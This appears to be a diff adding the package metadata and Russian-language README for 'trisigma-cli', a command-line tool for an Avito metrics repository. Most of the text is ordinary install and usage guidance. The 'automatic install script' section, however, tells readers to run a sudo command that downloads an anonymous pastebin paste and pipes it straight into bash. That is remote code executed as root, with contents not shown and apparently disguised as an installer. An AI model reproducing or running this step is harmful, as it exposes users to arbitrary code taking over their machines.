@@ -1,0 +1,147 @@
+Metadata-Version: 2.3
+Name: trisigma-cli
+Version: 0.1.2
+Summary: Trisigma CLI - инструмент командной строки для работы с Репозиторием метрик. Помогает создавать, валидировать и публиковать изменния в семантическом слое.
+License: Proprietary
+Keywords: cli,metrics,analytics,trisigma,data-quality,semantic-layer
+Author: Vlad Bozhev
+Author-email: vabozhev@avito.ru
+Requires-Python: >=3.9,<4.0
+Classifier: Development Status :: 4 - Beta
+Classifier: Environment :: Console
+Classifier: Intended Audience :: Developers
+Classifier: Intended Audience :: System Administrators
+Classifier: License :: Other/Proprietary License
+Classifier: Operating System :: MacOS
+Classifier: Operating System :: POSIX :: Linux
+Classifier: Programming Language :: Python :: 3
+Classifier: Programming Language :: Python :: 3.9
+Classifier: Programming Language :: Python :: 3.10
+Classifier: Programming Language :: Python :: 3.11
+Classifier: Programming Language :: Python :: 3.12
+Classifier: Programming Language :: Python :: 3.13
+Classifier: Topic :: Software Development :: Libraries :: Python Modules
+Classifier: Topic :: Software Development :: Quality Assurance
+Classifier: Topic :: Utilities
+Requires-Dist: aiohttp (>=3.12.0,<4.0.0)
+Requires-Dist: gitpython (>=3.1.0,<4.0.0)
+Requires-Dist: httpx (>=0.25.0,<0.26.0)
+Requires-Dist: openai (>=1.101.0,<2.0.0)
+Requires-Dist: packaging (>=25.0,<26.0)
+Requires-Dist: pydantic (>=2.0.0,<3.0.0)
+Requires-Dist: pyjwt (>=2.10.1,<3.0.0)
+Requires-Dist: pyperclip (>=1.9.0,<2.0.0)
+Requires-Dist: pyyaml (>=6.0.0,<7.0.0)
+Requires-Dist: rich (>=13.0.0,<14.0.0)
+Requires-Dist: tenacity (>=9.0.0,<10.0.0)
+Requires-Dist: textual (>=5.3.0,<6.0.0)
+Requires-Dist: transliterate (>=1.10.2,<2.0.0)
+Requires-Dist: typer[all] (>=0.16.1,<0.17.0)
+Requires-Dist: watchdog (>=6.0.0,<7.0.0)
+Project-URL: Documentation, https://trisigma.io/
+Project-URL: Homepage, https://trisigma.io/
+Description-Content-Type: text/markdown
+
+# trisigma-cli
+
+[![PyPI version](https://badge.fury.io/py/trisigma-cli.svg)](https://pypi.org/project/trisigma-cli/)
+[![Python](https://img.shields.io/pypi/pyversions/trisigma-cli.svg)](https://pypi.org/project/trisigma-cli/)
+
+Trisigma CLI - инструмент командной строки для работы с Репозиторием метрик. Помогает создавать, валидировать и публиковать изменния в семантическом слое.
+
+## Установка
+
+### Быстрая установка через pip
+
+```bash
+pip install trisigma-cli
+```
+
+### Установка через pipx (рекомендуется)
+
+pipx автоматически управляет PATH и изолирует зависимости:
+
+```bash
+pip install pipx
+pipx ensurepath
+pipx install trisigma-cli
+```
+
+### Автоматический установочный скрипт (macOS/Linux)
+
+Скрипт автоматически найдет Python, установит CLI и настроит PATH:
+
+```bash
+sudo curl -sSL https://pastebin.com/raw/JwywS2A8 | tr -d '\r' | bash
+```
+
+Что делает скрипт:
+- Найдет лучшую доступную версию Python (3.9-3.13)
+- Установит CLI через pipx (или pip если pipx недоступен)
+- Настроит PATH для вашего shell (zsh/bash)
+- Проверит корректность установки
+
+### Установка из корпоративного PyPI (Avito)
+
+Если вы работаете внутри корпоративной сети Avito:
+
+```bash
+pipx install trisigma-cli --pip-args="--index-url https://pypi.k.avito.ru/simple/"
+# или через pip
+PIP_INDEX_URL=https://pypi.k.avito.ru/simple/ pip install trisigma-cli
+```
+
+**Важно для Python 3.9 на macOS:** После установки через pip добавьте в `~/.zshrc`:
+
+```bash
+export PATH="$HOME/Library/Python/3.9/bin:$PATH"
+```
+
+Затем перезагрузите shell:
+
+```bash
+source ~/.zshrc
+```
+
+### Требования
+
+- Python 3.9-3.13 (Python 3.14 пока не поддерживается)
+- macOS, Linux или Windows (WSL)
+
+### Проверка установки
+
+После установки запустите:
+
+```bash
+trisigma --version
+```
+
+Если команда не найдена, убедитесь что директория со скриптами Python добавлена в PATH.
+
+## Начало работы
+
+Инициализация CLI с OAuth авторизацией:
+
+```bash
+trisigma init
+```
+
+Команда откроет браузер для авторизации и автоматически сохранит все необходимые настройки.
+
+## Использование
+
+```bash
+trisigma                        # Запуск интерактивного режима (TUI)
+trisigma sl validate            # Валидация репозитория метрик
+trisigma sl compile -s source   # Компиляция SQL для источника
+trisigma sl task AB-1234        # Создание ветки для задачи
+trisigma sl save -m "message"   # Сохранение изменений
+trisigma sl publish             # Публикация изменений и создание PR
+```
+
+Полный список команд доступен через `trisigma --help`.
+
+## Лицензия
+
+Этот проект лицензирован в соответствии с проприетарным лицензионным соглашением ООО «Авито Тех». См. файл [LICENSE](LICENSE) для подробностей.
+
